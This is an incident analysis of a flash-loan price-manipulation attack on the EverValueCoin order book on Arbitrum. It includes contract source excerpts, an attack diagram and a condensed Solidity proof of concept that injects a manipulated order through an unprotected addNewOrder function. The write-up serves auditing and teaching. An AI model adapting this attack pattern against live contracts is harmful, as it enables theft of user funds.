# EverValueCoin — Order Book Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-22 |
| **Protocol** | EverValueCoin (EVA) |
| **Chain** | Arbitrum |
| **Loss** | ~100,000 USD |
| **Attacker** | [0xaa06fde501a82ce1c0365273684247a736885daf](https://arbiscan.io/address/0xaa06fde501a82ce1c0365273684247a736885daf) |
| **Attack Tx** | [0xb13b2ab2...](https://arbiscan.io/tx/0xb13b2ab202cb902b8986cbd430d7227bf3ddca831b79786af145ccb5f00fcf3f) |
| **Vulnerable Contract** | [0x03339ecae41bc162dacae5c2a275c8f64d6c80a0](https://arbiscan.io/address/0x03339ecae41bc162dacae5c2a275c8f64d6c80a0) |
| **Root Cause** | Missing access control on `addNewOrder` function allows anyone to insert arbitrary orders into the order book |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/EverValueCoin_exp.sol) |

---

## 1. Vulnerability Overview

EverValueCoin's order book contract has no access control on the `addNewOrder` function, allowing anyone to insert arbitrary orders. The attacker borrowed a large amount of tokens via a Morpho flash loan, inserted malicious orders, and used them to manipulate the order book's price calculation, draining approximately 100,000 USD worth of assets.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: no access control on addNewOrder
interface Iorderbook {
    function addNewOrder(
        bytes32 _pairId,
        uint256 _quantity,
        uint256 _price,
        bool _isBuy,
        uint256 _timestamp
    ) external;
    // No onlyAuthorized or onlyRouter!
}

// Anyone can insert orders with arbitrary prices and quantities into the order book
// → Manipulated prices are used when the order book references prices

// ✅ Fix: restrict order insertion to authorized routers only
function addNewOrder(...) external onlyRouter {
    ...
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: src/OrderBookFactory.sol
function getPairIds() external view returns (bytes32[] memory) {
        return pairIds;
    }

// ... (lines 156-192 omitted) ...

    function setPairStatus(bytes32 _pairId, bool _enabled) external onlyOwner {
        if (!pairExists(_pairId)) revert OBF__PairDoesNotExist();
        pairs[_pairId].enabled = _enabled;

        emit PairStatusChanged(_pairId, _enabled);
    }

// ... (lines 199-203 omitted) ...

    function setPairFee(bytes32 _pairId, uint256 newFee) external onlyOwner {
        if (!pairExists(_pairId)) revert OBF__PairDoesNotExist();
        if (newFee > MAX_FEE) revert OBF__FeeExceedsMaximum(newFee, MAX_FEE);
        pairs[_pairId].changePairFee(newFee);

        emit PairFeeChanged(_pairId, newFee);
    }

// ... (lines 211-215 omitted) ...

    function setPairFeeAddress(bytes32 _pairId, address newFeeAddress) external onlyOwner {
        if (!pairExists(_pairId)) revert OBF__PairDoesNotExist();
        if (newFeeAddress == address(0)) revert OBF__InvalidFeeAddress();
        pairs[_pairId].feeAddress = newFeeAddress;

        emit PairFeeAddressChanged(_pairId, newFeeAddress);
    }

// ... (lines 223-230 omitted) ...

    function addNewOrder(bytes32 _pairId, uint256 _quantity, uint256 _price, bool _isBuy, uint256 _timestamp)
        external
        onlyEnabledPair(_pairId)
        nonReentrant
        whenNotPaused
    {
        if (_isBuy) {
            pairs[_pairId].addBuyOrder(_price, _quantity, _timestamp);
        } else {
            pairs[_pairId].addSellOrder(_price, _quantity, _timestamp);
        }
    }

// ... (lines 243-247 omitted) ...

    function cancelOrder(bytes32 _pairId, bytes32 _orderId) external nonReentrant {
        if (!pairExists(_pairId)) revert OBF__PairDoesNotExist();
        pairs[_pairId].cancelOrder(_orderId);
    }

// ... (lines 252-254 omitted) ...

    function pause() external onlyOwner {
        _pause();
        emit ContractPauseStatusChanged(true);
    }

// ... (lines 259-261 omitted) ...

    function unpause() external onlyOwner {
        _unpause();
        emit ContractPauseStatusChanged(false);
    }

// ... (lines 266-270 omitted) ...

    function getPairFee(bytes32 _pairId) external view returns (uint256) {
        if (!pairExists(_pairId)) revert OBF__PairDoesNotExist();
        return pairs[_pairId].fee;
    }

// ... (lines 275-280 omitted) ...

    function getTraderOrdersForPair(bytes32 _pairId, address _trader) external view returns (bytes32[] memory) {
        if (!pairExists(_pairId)) revert OBF__PairDoesNotExist();

        return pairs[_pairId].getTraderOrders(_trader);
    }

// ... (lines 286-291 omitted) ...

    function getOrderDetailForPair(bytes32 _pairId, bytes32 _orderId)
        external
        view
        returns (OrderBookLib.Order memory)
    {
        if (!pairExists(_pairId)) revert OBF__PairDoesNotExist();

        return pairs[_pairId].getOrderDetail(_orderId);
    }

// ... (lines 301-305 omitted) ...

    function getTop3BuyPricesForPair(bytes32 pairId) external view returns (uint256[3] memory) {
        return pairs[pairId].getTop3BuyPrices();
    }

// ... (lines 309-313 omitted) ...

    function getTop3SellPricesForPair(bytes32 pairId) external view returns (uint256[3] memory) {
        return pairs[pairId].getTop3SellPrices();
    }

// ... (lines 317-324 omitted) ...

    function getPricePointDataForPair(bytes32 _pairId, uint256 price, bool isBuy)
        external
        view
        returns (uint256 orderCount, uint256 orderValue)
    {
        OrderBookLib.PricePoint storage p = pairs[_pairId].getPrice(price, isBuy);
        return (p.orderCount, p.orderValue);
    }

// ... (lines 333-339 omitted) ...

    function checkBalanceTrader(bytes32 _pairId, address _trader)
        external
        view
        returns (PairLib.TraderBalance memory)
    {
        if (!pairExists(_pairId)) revert OBF__PairDoesNotExist();
        return pairs[_pairId].getTraderBalances(_trader);
    }

// ... (lines 348-354 omitted) ...

    function withdrawBalanceTrader(bytes32 _pairId, bool baseTokenWithdrawal) external nonReentrant {
        if (!pairExists(_pairId)) revert OBF__PairDoesNotExist();
        pairs[_pairId].withdrawBalance(msg.sender, baseTokenWithdrawal);
    }

// ... (lines 359-363 omitted) ...

    function pairExists(bytes32 _pairId) private view returns (bool) {
        return pairs[_pairId].baseToken != address(0x0);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ Morpho Flash Loan (borrow large amount of tokens)
  │
  ├─[2]─▶ Swap tokens via UniswapV3
  │         └─ Manipulate market price
  │
  ├─[3]─▶ orderbook.addNewOrder(pairId, qty, manipulatedPrice, ...)
  │         └─ No access control → arbitrary order insertion succeeds
  │
  ├─[4]─▶ Liquidate favorable position using manipulated order book price
  │         └─ Excess profit obtained
  │
  └─[5]─▶ Repay flash loan + retain ~100,000 USD profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function onMorphoFlashLoan(uint256 fee, bytes calldata data) external {
    // [1] Manipulate market price using tokens received from flash loan
    ISwapRouter(swapRouter).exactInputSingle(
        ISwapRouter.ExactInputSingleParams({
            tokenIn: tokenA,
            tokenOut: tokenB,
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: flashLoanAmount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        })
    );

    // [2] Insert fraudulent order into order book at manipulated price
    // No access control on addNewOrder → callable by anyone
    Iorderbook(orderbook).addNewOrder(
        pairId,
        quantity,
        manipulatedPrice, // Price manipulated relative to actual market price
        true,             // isBuy
        block.timestamp
    );

    // [3] Execute favorable trade using manipulated order book price
    // Realize excess profit
    executeAdvantageTrade();

    // [4] Repay flash loan
    IERC20(tokenA).transfer(msg.sender, flashLoanAmount + fee);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Access Control (no `onlyRouter` on `addNewOrder`, allowing anyone to insert arbitrary orders into the order book) |
| **Attack Vector** | Flash loan + fraudulent order book insertion |
| **Impact Scope** | Large-scale protocol asset drain |
| **CWE** | CWE-284: Improper Access Control |
| **DASP Classification** | Access Control / Price Manipulation |

## 6. Remediation Recommendations

1. **Restrict order book insertion permissions**: Limit `addNewOrder` so that only authorized router contracts can call it.
2. **Order validity validation**: Verify that the price of inserted orders falls within a reasonable range relative to the current market price.
3. **Order book manipulation detection**: Emit events and implement admin alerts when orders with abnormal prices are inserted.
4. **External price oracle**: Supplement the order book's internal price with an external oracle such as Chainlink.

## 7. Lessons Learned

- In order book-based DEXes, access control on order insertion is even more critical than in AMMs.
- The absence of access control on a critical state-changing function can lead to catastrophic outcomes when combined with flash loans.
- On-chain order books have a wide variety of price manipulation vectors and therefore require especially rigorous security audits.